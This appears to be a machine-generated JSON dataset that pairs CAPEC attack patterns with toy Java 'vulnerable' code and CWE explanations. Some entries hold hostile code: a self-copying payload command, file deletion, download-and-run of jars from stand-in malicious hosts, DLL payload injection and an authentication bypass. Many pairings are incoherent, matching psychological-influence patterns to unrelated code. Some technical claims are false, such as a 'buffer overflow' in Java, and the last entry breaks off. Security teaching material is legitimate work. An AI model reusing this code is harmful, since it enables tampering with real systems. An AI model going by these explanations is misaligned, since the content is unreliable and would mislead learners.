        "description": "This Java code snippet demonstrates a simple incentive system where users earn points and receive rewards upon reaching a threshold. The main idea of the CAPEC is represented by manipulating user behavior through incentives (points and rewards). The code includes several CWE-related vulnerabilities:\n\n1. **CWE-1229 (Creation of Emergent Resource)**: The `grantReward` method creates a new resource (reward) that can be exploited if not properly managed.\n2. **CWE-405 (Asymmetric Resource Consumption)**: The reward system can be abused to consume resources disproportionately (e.g., granting rewards without proper checks).\n3. **CWE-654 (Reliance on a Single Factor in a Security Decision)**: The decision to grant a reward relies solely on the user's points, which can be manipulated.\n4. **CWE-656 (Reliance on Security Through Obscurity)**: The system assumes that the reward mechanism is secure without proper validation.\n5. **CWE-941 (Incorrectly Specified Destination in a Communication Channel)**: The `sendRewardNotification` method simulates sending a notification, which could be misdirected if not properly implemented.\n\nOverall, the code snippet illustrates how an adversary might exploit an incentive system by manipulating user points and rewards, highlighting the importance of robust security measures."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String SECRET_PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Login failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(SECRET_PASSWORD);\n    }\n}",
        "description": "This Java code snippet represents a simple login system that is vulnerable to several security weaknesses described in the CAPEC and related CWEs. The main idea of the CAPEC is to influence the target's actions or behavior by leveraging psychological principles. In this case, the code relies on a single factor (the password) for authentication (CWE-654), making it easy for an adversary to exploit. The code does not include any additional security measures, such as multi-factor authentication, making it susceptible to attacks. The simplicity of the authentication mechanism can be exploited by an attacker who can guess or obtain the password through social engineering or other means."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started...\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Echo the input back to the client\n                out.println(inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that accepts client connections and echoes back any received input. The server does not verify the identity of the client (CWE-300, CWE-940), making it susceptible to unauthorized access. Additionally, the server's echo functionality can be exploited for reflection attacks (CWE-301). The code demonstrates how an adversary can influence communication by matching the client's input and echoing it back, potentially making the client more receptive to further interaction. This aligns with the CAPEC's concept of 'Influence via Modes of Thinking' by adapting communication to the target's patterns."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import java.util.Scanner;\n\npublic class EyeCueVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate eye movement tracking (vulnerable part)\n        System.out.println(\"Tracking eye movements...\");\n        boolean eyeMovementDetected = trackEyeMovements();\n\n        // Observable discrepancy based on eye movement\n        if (eyeMovementDetected) {\n            System.out.println(\"Eye movement detected. Access granted.\");\n        } else {\n            System.out.println(\"No eye movement detected. Access denied.\");\n        }\n    }\n\n    private static boolean trackEyeMovements() {\n        // Simulated eye movement tracking logic\n        // In a real scenario, this would involve complex eye-tracking algorithms\n        // Here, we simulate a guessable CAPTCHA vulnerability\n        return Math.random() > 0.5; // Randomly allow or deny access\n    }\n}",
        "description": "This Java code snippet simulates a scenario where an adversary can gain information via non-verbal means, specifically through eye movements, as described in the CAPEC. The code prompts the user to enter a password and then simulates eye movement tracking. The `trackEyeMovements` method randomly decides whether eye movement is detected, representing a guessable CAPTCHA vulnerability (CWE-804). The observable discrepancy (CWE-203) is demonstrated by the different system responses based on the simulated eye movement detection. This discrepancy can reveal security-relevant information to an unauthorized actor. The code also touches on the concept of observable behavioral discrepancy (CWE-205) by indicating different behaviors based on eye movement detection."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n    private static final int SECRET_KEY = 123456; // Sensitive information\n\n    public static void main(String[] args) {\n        // Simulate speculative execution vulnerability\n        int userInput = Integer.parseInt(args[0]);\n        int result = 0;\n\n        if (userInput == 1) {\n            result = SECRET_KEY; // Transient execution may expose this\n        } else {\n            result = 0;\n        }\n\n        // Log the result, potentially exposing sensitive information\n        logger.info(\"Result: \" + result);\n    }\n}",
        "description": "This Java code snippet demonstrates a speculative execution vulnerability where sensitive information (SECRET_KEY) could be exposed transiently. The code simulates a scenario where speculative execution might incorrectly execute a branch and expose the SECRET_KEY. Additionally, the result is logged, which could lead to information exposure through log files. This embodies the main idea of the deprecated CAPEC 'Target Influence via Micro-Expressions' and related CWEs, particularly CWE-1342 and CWE-1420, by showing how transient execution can lead to sensitive data exposure."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (userInput == null || userInput.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n        if (userInput.contains(\"<script>\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Error: \" + userInput);\n            return;\n        }\n        \n        // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n        String template = \"<html><body>\" + userInput + \"</body></html>\";\n        response.getWriter().write(template);\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Target Influence via Neuro-Linguistic Programming (NLP)' and associated CWEs. The servlet processes user input without proper validation and neutralization, leading to multiple security issues:\n\n1. **CWE-1286: Improper Validation of Syntactic Correctness of Input** - The code checks if the input is null or empty but does not validate the syntactic correctness of the input.\n2. **CWE-81: Improper Neutralization of Script in an Error Message Web Page** - The code directly includes user input in an error message without neutralizing special characters, allowing for potential script injection.\n3. **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine** - The code constructs an HTML template with user input without neutralizing special elements, leading to potential template injection.\n\nThe code snippet represents the main idea of the deprecated CAPEC pattern by showing how improper handling of user input can lead to various security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableNLP {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your input:\");\n        String userInput = scanner.nextLine();\n\n        // Simulate processing the input in an NLP system\n        String processedInput = processInput(userInput);\n        System.out.println(\"Processed Input: \" + processedInput);\n    }\n\n    private static String processInput(String input) {\n        // Vulnerable to improper neutralization of quoting syntax (CWE-149)\n        if (input.contains(\"'\") || input.contains(\"\\\"\") || input.contains(\"`\")) {\n            System.out.println(\"Warning: Input contains quotes!\");\n        }\n\n        // Vulnerable to improper validation of syntactic correctness of input (CWE-1286)\n        if (!input.matches(\"^[a-zA-Z0-9 ]*$\")) {\n            System.out.println(\"Warning: Input contains invalid characters!\");\n        }\n\n        // Simulate a guessable CAPTCHA (CWE-804)\n        String captcha = \"1234\"; // Hardcoded CAPTCHA for demonstration\n        System.out.println(\"Enter CAPTCHA (1234):\");\n        Scanner scanner = new Scanner(System.in);\n        String captchaInput = scanner.nextLine();\n        if (!captcha.equals(captchaInput)) {\n            System.out.println(\"CAPTCHA validation failed!\");\n        } else {\n            System.out.println(\"CAPTCHA validation succeeded!\");\n        }\n\n        return input;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Natural Language Processing (NLP) system that embodies the main idea of the deprecated CAPEC 'Target Influence via Voice in NLP'. The code includes vulnerabilities related to the following CWEs:\n\n1. CWE-149: Improper Neutralization of Quoting Syntax - The code checks for quotes in the input but does not properly neutralize them, potentially leading to injection attacks.\n2. CWE-1286: Improper Validation of Syntactic Correctness of Input - The code attempts to validate the input but does so inadequately, allowing invalid characters to pass through.\n3. CWE-804: Guessable CAPTCHA - The CAPTCHA is hardcoded and easily guessable, making it ineffective against automated attacks.\n\nThe code reads user input, processes it with minimal validation, and includes a hardcoded CAPTCHA challenge, demonstrating common vulnerabilities in NLP systems."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class HumanBufferOverflowExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"password123\";\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-120: Buffer Copy without Checking Size of Input\n            char[] buffer = new char[8];\n            int bytesRead = in.read(buffer, 0, 16); // Potential buffer overflow\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            String receivedMessage = new String(buffer);\n            System.out.println(\"Received: \" + receivedMessage); // No integrity check\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Target Influence via The Human Buffer Overflow' concept by simulating a communication channel where messages are transmitted and received without proper security measures. The code includes several vulnerabilities:\n\n1. **CWE-319: Cleartext Transmission of Sensitive Information** - Sensitive data (e.g., a password) is transmitted in cleartext, making it susceptible to interception by unauthorized actors.\n\n2. **CWE-120: Buffer Copy without Checking Size of Input** - The code reads data into a buffer without verifying the size, leading to a potential buffer overflow.\n\n3. **CWE-924: Improper Enforcement of Message Integrity During Transmission** - The received message is printed without any integrity checks, making it possible for an attacker to modify the message during transmission.\n\nThese vulnerabilities illustrate how an attacker could exploit weaknesses in communication channels to influence the target, akin to the 'human buffer overflow' concept where messages are subtly embedded within communication to affect the subconscious mind of the listener."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import java.util.Scanner;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        // Simulate a data query that exposes sensitive information\n        if (username.equals(\"admin\")) {\n            System.out.println(\"Welcome, admin. Here is the sensitive data: [Sensitive Data]\");\n        } else {\n            System.out.println(\"Welcome, \" + username + \".\");\n        }\n\n        // Simulate a CAPTCHA that is easily guessable\n        System.out.print(\"Enter CAPTCHA (1234): \");\n        String captcha = scanner.nextLine();\n        if (!captcha.equals(\"1234\")) {\n            System.out.println(\"CAPTCHA failed.\");\n        } else {\n            System.out.println(\"CAPTCHA passed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information can be exposed through data queries and a guessable CAPTCHA. The code asks for a username and password, and if the username is 'admin', it exposes sensitive data. This represents CWE-202 (Exposure of Sensitive Information Through Data Queries). Additionally, the code includes a CAPTCHA check that is trivially guessable (always '1234'), representing CWE-804 (Guessable CAPTCHA). The main idea of the CAPEC is to show how an attacker can influence the target to reveal sensitive information through seemingly innocuous interactions, such as interviews or interrogations."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establishing a communication channel without verifying the endpoint\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Sending data without verifying the destination\n            out.println(\"Sensitive Data\");\n\n            // Receiving data without verifying the source\n            String response = in.readLine();\n            System.out.println(\"Received: \" + response);\n\n            // Observable behavioral discrepancy\n            if (response.equals(\"Expected Response\")) {\n                System.out.println(\"Behavior A\");\n            } else {\n                System.out.println(\"Behavior B\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that embodies the main idea of 'Target Influence via Instant Rapport' and related CWEs. The code establishes a socket connection to 'example.com' on port 8080 without verifying the identity of the endpoint (CWE-300). It sends sensitive data without ensuring the destination is correct (CWE-941) and receives data without verifying the source (CWE-940). Additionally, the code exhibits observable behavioral discrepancies based on the response received (CWE-205). This lack of proper verification and observable behavior can be exploited by an attacker to influence the target and gain unauthorized access or information."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class DeviceFirmware {\n    private static final String CONFIG_FILE = \"/path/to/config/pre_production_config.xml\";\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n\n    public static void main(String[] args) {\n        // Load configuration\n        loadConfiguration(CONFIG_FILE);\n\n        // Use a non-updateable component\n        NonUpdateableComponent component = new NonUpdateableComponent();\n        component.performCriticalOperation();\n\n        // Store confidential information in an unprotected manner\n        storeConfidentialInfo(SECRET_KEY);\n    }\n\n    private static void loadConfiguration(String configFile) {\n        // Simulate loading a pre-production configuration\n        System.out.println(\"Loading configuration from: \" + configFile);\n    }\n\n    private static void storeConfidentialInfo(String key) {\n        // Simulate storing confidential information\n        System.out.println(\"Storing confidential information with key: \" + key);\n    }\n}\n\nclass NonUpdateableComponent {\n    public void performCriticalOperation() {\n        // Simulate a critical operation that cannot be updated\n        System.out.println(\"Performing critical operation with non-updateable component.\");\n    }\n}",
        "description": "This Java code snippet represents a scenario where a device's firmware is compromised during the manufacturing process, embodying the CAPEC 'Modification During Manufacture'. The code includes several CWE-related vulnerabilities: \n1. Reliance on Insufficiently Trustworthy Component (CWE-1357): The `NonUpdateableComponent` class simulates a critical component that cannot be updated, posing a security risk.\n2. Product Released in Non-Release Configuration (CWE-1269): The firmware loads a pre-production configuration file, indicating that the product is released in a non-release configuration.\n3. Unprotected Confidential Information on Device (CWE-1297): The `storeConfidentialInfo` method stores a hardcoded secret key, representing unprotected confidential information accessible by unauthorized parties.\n\nThe code demonstrates how an attacker could exploit these vulnerabilities to compromise the device during its manufacturing stage, aligning with the CAPEC description."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableDistribution {\n    public static void main(String[] args) {\n        // CWE-1269: Product Released in Non-Release Configuration\n        Properties config = new Properties();\n        try (InputStream input = new FileInputStream(\"config.properties\")) {\n            config.load(input);\n            String mode = config.getProperty(\"mode\");\n            if (\"development\".equals(mode)) {\n                System.out.println(\"Warning: Running in development mode!\");\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveData = \"Sensitive Information\";\n        System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        try {\n            Class.forName(\"com.vulnerable.ThirdPartyComponent\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        try {\n            Class.forName(\"com.untrusted.Component\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        if (System.getProperty(\"os.name\").contains(\"Windows\")) {\n            System.out.println(\"Running on Windows\");\n        } else {\n            System.out.println(\"Running on non-Windows OS\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It includes: \n1. CWE-1269: The application reads a configuration file and warns if it is running in development mode, indicating a non-release configuration. \n2. CWE-200: Sensitive information is printed to the console, exposing it to unauthorized actors. \n3. CWE-1395: The application attempts to load a potentially vulnerable third-party component. \n4. CWE-1357: The application attempts to load an untrusted component. \n5. CWE-207: The application reveals its operating system, which could be used to identify discrepancies in behavior compared to equivalent products. This code highlights the risks of tampering and vulnerabilities that can be introduced during the distribution process."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import java.util.Random;\n\npublic class HardwareIntegrityAttack {\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 0;\n    private static final int MAX_CLOCK_SPEED = 3000; // in MHz\n    private static final int MIN_CLOCK_SPEED = 1000; // in MHz\n    private static final int ERROR_INJECTION_THRESHOLD = 3;\n    private static int redundancyCounter = 5;\n\n    public static void main(String[] args) {\n        // Simulate voltage and clock glitches\n        Random random = new Random();\n        int voltage = random.nextInt((MAX_VOLTAGE - MIN_VOLTAGE) + 1) + MIN_VOLTAGE;\n        int clockSpeed = random.nextInt((MAX_CLOCK_SPEED - MIN_CLOCK_SPEED) + 1) + MIN_CLOCK_SPEED;\n\n        // Check for improper protection against voltage and clock glitches\n        if (voltage < MIN_VOLTAGE || voltage > MAX_VOLTAGE || clockSpeed < MIN_CLOCK_SPEED || clockSpeed > MAX_CLOCK_SPEED) {\n            System.out.println(\"Voltage or clock glitch detected!\");\n            injectError();\n        }\n\n        // Simulate error injection to degrade hardware redundancy\n        if (redundancyCounter <= ERROR_INJECTION_THRESHOLD) {\n            System.out.println(\"Redundancy degraded! System operating in degraded mode.\");\n        } else {\n            System.out.println(\"System operating normally.\");\n        }\n    }\n\n    private static void injectError() {\n        redundancyCounter--;\n        System.out.println(\"Error injected! Redundancy counter: \" + redundancyCounter);\n    }\n}",
        "description": "This Java code snippet simulates a hardware integrity attack by exploiting weaknesses in voltage and clock glitch protection and error injection to degrade hardware redundancy. The code randomly generates voltage and clock speed values and checks if they fall outside the acceptable range, indicating a glitch. If a glitch is detected, an error is injected, reducing the redundancy counter. If the redundancy counter falls below a certain threshold, the system is considered to be operating in a degraded mode. This represents the main idea of the CAPEC, where an adversary exploits weaknesses in the system maintenance process to cause changes in the hardware, leading to potential attacks."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "public class MaliciousLogic {\n    public static void main(String[] args) {\n        // Simulate benign functionality\n        System.out.println(\"Welcome to the digital photo frame!\");\n        // Hidden malicious logic\n        if (isMaliciousConditionMet()) {\n            executeMaliciousPayload();\n        }\n    }\n\n    private static boolean isMaliciousConditionMet() {\n        // Check for a specific condition to trigger the malicious logic\n        return true; // In a real scenario, this would be more complex\n    }\n\n    private static void executeMaliciousPayload() {\n        // Malicious code that replicates itself\n        try {\n            Runtime.getRuntime().exec(\"cmd /c copy %0 %TEMP%\\malicious_copy.exe\");\n            // Further malicious actions can be added here\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Malicious Logic Insertion' (CAPEC-284) by embedding hidden malicious logic within a seemingly benign application. The main method simulates a digital photo frame's welcome message, while the hidden malicious logic checks for a specific condition (always true in this example) and then executes a payload. The payload attempts to replicate itself, demonstrating CWE-509 (Replicating Malicious Code). The code also indirectly touches on CWE-506 (Embedded Malicious Code) by containing hidden harmful functionality. This example highlights the risk of malicious logic being inserted into fielded systems, which can operate unnoticed and cause harm."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class InfectedSoftware {\n    public static void main(String[] args) {\n        System.out.println(\"Running benign functionality...\");\n        // Benign functionality\n        benignFunction();\n        // Malicious code hidden in the software\n        maliciousFunction();\n    }\n\n    private static void benignFunction() {\n        System.out.println(\"This is a benign function.\");\n    }\n\n    private static void maliciousFunction() {\n        // Hidden malicious logic\n        System.out.println(\"Executing hidden malicious code...\");\n        // Example of malicious action: deleting a file\n        try {\n            java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get(\"/path/to/important/file.txt\"));\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The main method runs a benign function that prints a message, simulating normal software behavior. However, it also calls a hidden malicious function that performs a harmful action, such as deleting an important file. This hidden malicious logic represents the CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) weaknesses. The code is designed to show how malicious logic can be embedded within otherwise benign software, executing harmful actions without the user's knowledge."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an authorized developer injects malicious logic into a product. The code downloads an update from a remote location without verifying its integrity (CWE-494) and then executes the downloaded code, which could contain embedded malicious logic (CWE-506). This represents the CAPEC 'Malicious Logic Inserted Into Product by Authorized Developer' by showing how an insider could introduce harmful behavior into a product through insecure practices."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class SecureApp {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        // Simulate authentication\n        authenticateUser();\n\n        // Critical operation that should only be performed if authenticated\n        if (isAuthenticated) {\n            performCriticalOperation();\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private static void authenticateUser() {\n        // Malicious alteration: Bypass authentication\n        isAuthenticated = true; // CWE-506: Embedded Malicious Code\n    }\n\n    private static void performCriticalOperation() {\n        // Critical operation that should be protected\n        System.out.println(\"Performing critical operation...\");\n    }\n}",
        "description": "This Java code snippet represents a scenario where an adversary has altered the development of a software application to embed malicious code. The `authenticateUser` method is supposed to handle user authentication, but it has been maliciously altered to always set `isAuthenticated` to true, effectively bypassing the authentication mechanism (CWE-506: Embedded Malicious Code). This alteration allows unauthorized access to the `performCriticalOperation` method, which should only be accessible to authenticated users. This embodies the main idea of CAPEC-Development Alteration, where an adversary modifies the system during development to achieve a negative impact once deployed."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, bytesRead, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            Process p = pb.start();\n            p.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads an update from a remote server without performing any integrity checks (CWE-494). It then executes the downloaded code, which could contain malicious functionality, from an untrusted source (CWE-829). This represents the main idea of the CAPEC, where an adversary manipulates the configuration management to introduce malicious code into the software build or update process."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import java.util.*;\nimport com.untrusted.library.UntrustedComponent;\n\npublic class VulnerableApplication {\n    public static void main(String[] args) {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        UntrustedComponent component = new UntrustedComponent();\n        \n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        if (component.isVulnerable()) {\n            System.out.println(\"Warning: Using a vulnerable component!\");\n        }\n        \n        // CWE-506: Embedded Malicious Code\n        component.executeMaliciousCode();\n        \n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        if (!component.isTrustworthy()) {\n            System.out.println(\"Warning: Component is not trustworthy!\");\n        }\n        \n        // CWE-1103: Use of Platform-Dependent Third Party Components\n        if (!component.isPlatformIndependent()) {\n            System.out.println(\"Warning: Component is platform-dependent!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that imports and uses a third-party component from an untrusted source. The code highlights several security weaknesses: \n1. CWE-829: The application includes functionality from an untrusted control sphere by importing 'UntrustedComponent' from 'com.untrusted.library'.\n2. CWE-1395: The application checks if the component is vulnerable but proceeds to use it regardless.\n3. CWE-506: The component executes malicious code, representing embedded malicious logic.\n4. CWE-1357: The application relies on a component that is not sufficiently trustworthy.\n5. CWE-1103: The component may not provide equivalent functionality across all platforms, indicating platform dependency.\nThis snippet embodies the main idea of CAPEC-442, where an adversary could insert malicious logic into a product via the inclusion of insecure third-party components."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecureSystem {\n    private boolean isAuthenticated = false;\n    private String sensitiveData = \"Sensitive Information\";\n\n    // Design alteration: intentionally flawed authentication mechanism\n    public void authenticate(String password) {\n        // CWE-657: Violation of Secure Design Principles\n        if (password.equals(\"password123\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    public String getSensitiveData() {\n        if (isAuthenticated) {\n            return sensitiveData;\n        } else {\n            return \"Access Denied\";\n        }\n    }\n\n    public static void main(String[] args) {\n        SecureSystem system = new SecureSystem();\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(system.getSensitiveData()); // Access Denied\n        system.authenticate(\"password123\");\n        System.out.println(system.getSensitiveData()); // Sensitive Information\n    }\n}",
        "description": "This Java code snippet represents a system where the design has been intentionally altered to include a flawed authentication mechanism. The `authenticate` method uses a hardcoded password, violating secure design principles (CWE-657). The `getSensitiveData` method relies on client-side enforcement of security, which is a poor practice (CWE-602). The main method demonstrates how an unauthorized user can easily gain access to sensitive information (CWE-497) by using the hardcoded password. This embodies the main idea of CAPEC-Design Alteration, where the system's design is intentionally flawed to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousDLLInjector {\n    public static void main(String[] args) {\n        try {\n            // Path to the legitimate DLL\n            Path dllPath = Paths.get(\"C:\\\\path\\\\to\\\\legitimate.dll\");\n            byte[] dllBytes = Files.readAllBytes(dllPath);\n\n            // Malicious payload to be injected\n            byte[] maliciousPayload = \"malicious_code\".getBytes();\n\n            // Find a gap in the DLL to inject the payload\n            int injectionPoint = findInjectionPoint(dllBytes);\n            if (injectionPoint != -1) {\n                System.arraycopy(maliciousPayload, 0, dllBytes, injectionPoint, maliciousPayload.length);\n                Files.write(dllPath, dllBytes);\n                System.out.println(\"Malicious payload injected successfully.\");\n            } else {\n                System.out.println(\"No suitable injection point found.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static int findInjectionPoint(byte[] dllBytes) {\n        // Simplified example: find a sequence of null bytes (gap) in the DLL\n        for (int i = 0; i < dllBytes.length - 10; i++) {\n            boolean isGap = true;\n            for (int j = 0; j < 10; j++) {\n                if (dllBytes[i + j] != 0) {\n                    isGap = false;\n                    break;\n                }\n            }\n            if (isGap) {\n                return i;\n            }\n        }\n        return -1;\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of embedding a virus into a DLL by finding gaps in the DLL's bytecode and injecting malicious payloads into those gaps. The code reads a legitimate DLL file, searches for a sequence of null bytes (representing gaps), and injects a malicious payload into the first found gap. This represents the CAPEC 'Embed Virus into DLL' and incorporates related CWEs such as CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code). The code is a simplified example and does not represent a real-world attack but illustrates the concept of DLL tampering and malicious code injection."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
